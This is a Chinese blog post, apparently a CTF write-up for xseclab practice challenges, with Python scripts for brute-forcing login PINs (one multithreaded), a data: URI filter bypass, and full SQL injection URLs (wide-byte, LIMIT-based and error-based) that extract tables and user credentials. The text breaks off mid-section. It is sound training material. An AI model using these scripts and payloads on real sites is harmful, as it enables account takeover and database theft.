@@ -1,0 +1,820 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/spig.js"></script>
+<link rel="stylesheet" href="css/lib/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+
+
+<div id="spig" class="spig">
+    <div id="message"></div>
+    <div id="mumu" class="mumu"></div>
+</div>
+
+ 
+    
+
+    <title>网络信息安全攻防 | 知秋’s blog</title>
+    <meta name="author" content="知秋">
+    
+    <meta name="description" content="知秋">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="网络信息安全攻防"/>
+    <meta property="og:site_name" content="知秋"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="知秋" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tomorrow-night-blue.min.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+<script type="text/javascript" src="../../js/love.js"></script>  
+ 
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
+ 
+  
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/background1.JPG); background-repeat: no-repeat;
+  background-size: 100% 100%;">
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+   
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">知秋</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="../../images/touxiang.jpeg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">知秋</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/essay/">
+                    essay <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ctf/">
+                    ctf <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/web/">
+                    web <span class="right">11</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/writeup/">
+                    writeup <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/knowledge/">
+                    knowledge <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/note/">
+                    note <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/crypt/">
+                    crypt <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/vulnerability/">
+                    vulnerability <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/life/">
+                    life <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+	<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+<script>
+(function($){$.fn.snow=function(options){var $flake=$('<div id="flake" />').css({'position':'absolute','top':'-50px'}).html('&#10052;'),documentHeight=$(document).height(),documentWidth=$(document).width(),defaults={minSize:10,maxSize:20,newOn:500,flakeColor:"#FFFFFF"},options=$.extend({},defaults,options);var interval=setInterval(function(){var startPositionLeft=Math.random()*documentWidth-100,startOpacity=0.5+Math.random(),sizeFlake=options.minSize+Math.random()*options.maxSize,endPositionTop=documentHeight-40,endPositionLeft=startPositionLeft-100+Math.random()*200,durationFall=documentHeight*10+Math.random()*5000;$flake.clone().appendTo('body').css({left:startPositionLeft,opacity:startOpacity,'font-size':sizeFlake,color:options.flakeColor}).animate({top:endPositionTop,left:endPositionLeft,opacity:0.2},durationFall,'linear',function(){$(this).remove()});},options.newOn);};})(jQuery);
+$.fn.snow({ minSize: 10, maxSize: 60, newOn: 1000, flakeColor: '#FFF' });
+</script>
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/ctf/">ctf</a><a class="breadcrumb" href="/categories/ctf/web/">web</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>网络信息安全攻防</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2018-02-24T06:55:00.000Z"><a href="/posts/53139f85.html">2018-02-24</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/ctf/" class="chip pink lighten-1">ctf</a>
+        
+            <a href="/tags/web/" class="chip pink lighten-1">web</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#脚本关"><span class="section table-of-contents-text">脚本关</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#快速口算"><span class="section table-of-contents-text">快速口算</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#逗比验证码第一期"><span class="section table-of-contents-text">逗比验证码第一期</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#逗比验证码第二期"><span class="section table-of-contents-text">逗比验证码第二期</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#逗比的验证码第三期（SESSION）"><span class="section table-of-contents-text">逗比的验证码第三期（SESSION）</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#微笑一下就能过关了"><span class="section table-of-contents-text">微笑一下就能过关了</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#注入关"><span class="section table-of-contents-text">注入关</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#宽字节注入"><span class="section table-of-contents-text">宽字节注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#limit注入"><span class="section table-of-contents-text">limit注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#图片宽字节注入"><span class="section table-of-contents-text">图片宽字节注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#报错注入"><span class="section table-of-contents-text">报错注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#盲注"><span class="section table-of-contents-text">盲注</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#cookie注入"><span class="section table-of-contents-text">cookie注入</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#哈希后的密码是不能产生注入的"><span class="section table-of-contents-text">哈希后的密码是不能产生注入的</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#解密关"><span class="section table-of-contents-text">解密关</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#以管理员身份登录系统"><span class="section table-of-contents-text">以管理员身份登录系统</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#邂逅对门的妹纸"><span class="section table-of-contents-text">邂逅对门的妹纸</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#思科密码破解"><span class="section table-of-contents-text">思科密码破解</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#uawei-h3c-交换机的加密密码"><span class="section table-of-contents-text">uawei/h3c 交换机的加密密码</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#md5真的能碰撞嘛"><span class="section table-of-contents-text">md5真的能碰撞嘛?</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#有签名限制的读取任意文件"><span class="section table-of-contents-text">有签名限制的读取任意文件</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#综合关"><span class="section table-of-contents-text">综合关</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#渗透测试第一期"><span class="section table-of-contents-text">渗透测试第一期</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#没有注入到底能不能绕过登录"><span class="section table-of-contents-text">没有注入到底能不能绕过登录</span></a></li></ol></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <p>以前做的时候，挺多不会做的，这次卷土重来，重新刷一下！</p>
+<a id="more"></a>
+<h1 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h1><h2 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url=<span class="string">"http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"</span></span><br><span class="line">session=requests.session()</span><br><span class="line">regular=r<span class="string">'[0-9+*()]+[)]'</span></span><br><span class="line">header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'</span>&#125;</span><br><span class="line">res=session.get(url,headers=header)</span><br><span class="line"><span class="built_in">print</span>(res.content)</span><br><span class="line">chen=re.compile(regular)</span><br><span class="line">obj=chen.findall(res.content.decode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="built_in">print</span>(obj)</span><br><span class="line">html=<span class="built_in">eval</span>(obj[0])</span><br><span class="line">data=&#123;<span class="string">'v'</span>:html&#125;</span><br><span class="line">r=session.post(url,data=data,headers=header)</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure>
+<h2 id="逗比验证码第一期"><a href="#逗比验证码第一期" class="headerlink" title="逗比验证码第一期"></a>逗比验证码第一期</h2><p>该验证码登入一次后，没有失效，再次登入用此验证码，还能生效。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php"</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">pwd</span> <span class="keyword">in</span> range(1000, 10000):</span><br><span class="line">    payload = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: <span class="built_in">pwd</span>, <span class="string">'vcode'</span>: <span class="string">'83HE'</span>&#125;</span><br><span class="line">    header=&#123;<span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=98f76f8684f350fd7c311decb810cdf8'</span>&#125;</span><br><span class="line">    r=s.post(url,data=payload,headers=header)</span><br><span class="line">    <span class="built_in">print</span>(r.content)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> r.content.decode(<span class="string">'utf-8'</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"正确的密码为:"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pwd</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.content)</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"正在尝试爆破"</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">pwd</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="逗比验证码第二期"><a href="#逗比验证码第二期" class="headerlink" title="逗比验证码第二期"></a>逗比验证码第二期</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import requests, re</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php'</span></span><br><span class="line">login = <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php'</span></span><br><span class="line">s = requests.session()</span><br><span class="line">c = s.get(url).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">curTask = 1000</span><br><span class="line">maxTask = 10000</span><br><span class="line">flag = False</span><br><span class="line">right = <span class="string">''</span></span><br><span class="line">header = &#123;<span class="string">'Referer'</span>: <span class="string">'http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php'</span>,</span><br><span class="line">          <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">          <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def thread():</span><br><span class="line">    global lock</span><br><span class="line">    global curTask</span><br><span class="line">    global maxTask</span><br><span class="line">    global flag</span><br><span class="line">    global right</span><br><span class="line">    global header</span><br><span class="line">    <span class="keyword">while</span> not flag:  <span class="comment"># 当flag为假也就是正确密码还没出来时，不断取任务来完成</span></span><br><span class="line">        lock.acquire()  <span class="comment"># 取任务  #这个过程不能被打断</span></span><br><span class="line">        myTask = curTask</span><br><span class="line">        curTask = curTask + 1</span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="keyword">if</span> myTask &gt;= maxTask:  <span class="comment"># 所有任务已经完成就退出</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        data = &#123;<span class="string">'username'</span>: <span class="string">'admin'</span>, <span class="string">'pwd'</span>: str(myTask), <span class="string">'vcode'</span>: <span class="string">''</span>, <span class="string">'submit'</span>: <span class="string">'submit'</span>&#125;</span><br><span class="line">        c1 = s.post(login, data=data, headers=header).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="built_in">print</span>(str(myTask) + <span class="string">':'</span> + c1)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> c1:</span><br><span class="line">            right = str(myTask) + <span class="string">', '</span> + c1</span><br><span class="line">            flag = True  <span class="comment"># 当密码正确时，flag为真</span></span><br><span class="line"><span class="comment"># 多线程执行</span></span><br><span class="line">threadNum = 50</span><br><span class="line">threadlist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(threadNum):</span><br><span class="line">    threadlist.append(threading.Thread(target=thread))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threadlist:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threadlist:</span><br><span class="line">    i.join()</span><br><span class="line"><span class="comment"># 最终输出正确结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'pwd is '</span> + right)</span><br></pre></td></tr></table></figure>
+<h2 id="逗比的验证码第三期（SESSION）"><a href="#逗比的验证码第三期（SESSION）" class="headerlink" title="逗比的验证码第三期（SESSION）"></a>逗比的验证码第三期（SESSION）</h2><p>解法同上面</p>
+<h2 id="微笑一下就能过关了"><a href="#微笑一下就能过关了" class="headerlink" title="微笑一下就能过关了"></a>微笑一下就能过关了</h2><p>查看源代码可得<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'view-source'</span>])) &#123; </span><br><span class="line">        show_source(__FILE__); </span><br><span class="line">        <span class="built_in">exit</span>(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    include(<span class="string">'flag.php'</span>); </span><br><span class="line"></span><br><span class="line">    <span class="variable">$smile</span> = 1;  </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!isset (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/\./'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/%/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/[0-9]/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/http/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>]) ) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/https/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>]) ) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/ftp/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/telnet/'</span>, <span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/_/'</span>, <span class="variable">$_SERVER</span>[<span class="string">'QUERY_STRING'</span>])) <span class="variable">$smile</span> = 0; </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span>) &#123; </span><br><span class="line">        <span class="keyword">if</span> (@file_exists (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>])) <span class="variable">$smile</span> = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$smile</span>) &#123; </span><br><span class="line">        <span class="variable">$smile</span> = @file_get_contents (<span class="variable">$_GET</span>[<span class="string">'^_^'</span>]);  </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smile</span> === <span class="string">"(●'◡'●)"</span>) die(<span class="variable">$flag</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;!doctype html&gt; </span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Show me your smile :)&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; </span><br><span class="line">&lt;div class=<span class="string">"loginform cf"</span>&gt; </span><br><span class="line">    &lt;form name=<span class="string">"login"</span> action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span> accept-charset=<span class="string">"utf-8"</span>&gt; </span><br><span class="line">        &lt;ul&gt; </span><br><span class="line">            &lt;li&gt; </span><br><span class="line">                &lt;label <span class="keyword">for</span>=<span class="string">"SMILE"</span>&gt;请使用微笑过关&lt;a href=<span class="string">"?view-source"</span>&gt;源代码&lt;/a&gt;&lt;/label&gt; </span><br><span class="line">                &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"T_T"</span> placeholder=<span class="string">"where is your smile"</span> required&gt; </span><br><span class="line">            &lt;/li&gt; </span><br><span class="line">            &lt;li&gt;&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Show"</span>&gt; &lt;/li&gt; </span><br><span class="line">        &lt;/ul&gt; </span><br><span class="line">    &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;div style=<span class="string">"text-align:center;clear:both"</span>&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●<span class="string">'◡'</span>●)</span><br></pre></td></tr></table></figure>
+<h2 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h2><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>输入%df’出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%df<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p>判断字段长短<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' order by 3 %23</span></span><br></pre></td></tr></table></figure></p>
+<p>得到显示位</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure>
+<p>显示位为 2,3</p>
+<p>查看表名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23</span></span><br></pre></td></tr></table></figure></p>
+<p>得到字段名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7361655f757365725f73716c6934) %23</span></span><br></pre></td></tr></table></figure></p>
+<p>得到字段数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=2%bf<span class="string">' union select 1,2,(select group_concat(title_1,content_1) from sae_user_sqli4) %23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h2><p>猜测后台是<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select * from  table <span class="built_in">limit</span> start,num</span><br></pre></td></tr></table></figure></p>
+<p>发现只有limit参数有用，num没影响</p>
+<p>遇到limit的注入的时候，可以使用如下的语句进行报错注入。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select field from user <span class="built_in">where</span> id=XXX order by id <span class="built_in">limit</span> 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,SQL注入语句)),1);</span><br></pre></td></tr></table></figure></p>
+<p>得到表名article,user<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()))),1)%23%20&amp;num=100%20%23</span><br></pre></td></tr></table></figure></p>
+<p>得到user表中的字段id,username,password,lastloginI<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0%20procedure%20analyse(extractvalue(rand(),concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x75736572))),1)%23%20&amp;num=100%20%23</span><br></pre></td></tr></table></figure></p>
+<p>字段数据<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=6 procedure analyse(extractvalue(rand(),concat(0x3a,(select group_concat(username,password) from user))),1)%23</span><br><span class="line">&amp;num=100 %23</span><br></pre></td></tr></table></figure></p>
+<h2 id="图片宽字节注入"><a href="#图片宽字节注入" class="headerlink" title="图片宽字节注入"></a>图片宽字节注入</h2><p>在页面上看不出显示的结果，要在burpsuite上查看<br>网上说是图片宽字节注入，一直抓不到图片的数据包，只好作罢</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><a href="http://blog.csdn.net/mvcandroid/article/details/73995898" target="_blank" rel="noopener">一些常见的报错注入</a><br>报错注入语句<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">select count(*),concat(0x3a,0x3a,(注入语句),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a</span><br></pre></td></tr></table></figure></p>
+<p>得到数据库名<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin<span class="string">' union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23</span></span><br></pre></td></tr></table></figure></p>
